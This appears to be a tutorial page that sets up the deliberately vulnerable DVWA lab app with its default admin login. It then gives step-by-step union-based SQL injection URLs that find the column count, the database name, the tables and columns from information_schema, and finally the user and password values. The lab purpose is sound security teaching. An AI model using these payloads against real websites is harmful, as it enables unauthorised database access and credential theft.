---
id: UNIONBASEDSQLINJECTION 
title: Introduction 
sidebar_label: Union Based SQL Injection 
---

DVWA Setup and Configuration
----------------------------
Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.

Download : www.dvwa.co.uk --> Zip File --> extract --> rename folder to dvwa===> paste it in httdoc of xampp server folder.

To access start XAMPP server and go to your browser and type 127.0.0.1/dvwa
username: admin
password: password

Union Based Injection
---------------------
Attack in which instead of attacking on the login athentication panel we try to attack the database of the webiste to gain access to the main credential table having username and password if the website.

Target : http://127.0.0.1/dvwa/vulnerabilities/sqli/

Step 1: Find any GET method in the website
GET Method: .php?id=1 (Something=Something)
POST Method: .php/id/ 

These DVWA link are for me it will be different for you guys  

Step 2: Check the validation and exeception handling of the site
http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit#

Step 3: Check the total number of columns in the respected table
http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' order by 1--+&Submit=Submit#

http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' order by 2--+&Submit=Submit#

http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' order by 3--+&Submit=Submit#

Step 4: Dump the column names and copy the structure to fill our custom query later
http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' union all select 1,2--+&Submit=Submit#

Step 5: Get the database name
http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' union all select 1,database()--+&Submit=Submit#

Database -> Tables -> Columns -> data -> username and password

Step 6: Get the tables from the database.
Schema : Database ki MAA
Tables: information_schema.tables
Columns: information_schema.columns

http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' union all select 1,table_name from information_schema.tables--+&Submit=Submit#

Target Table Found : users

Step 7: Get the columns of the users table
http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' union all select 1,column_name from information_schema.columns where table_name='users'--+&Submit=Submit#

Step 8: Get the user and password details
http://192.168.0.18/dvwa/vulnerabilities/sqli/?id=1' union all select user,password from users--+&Submit=Submit#

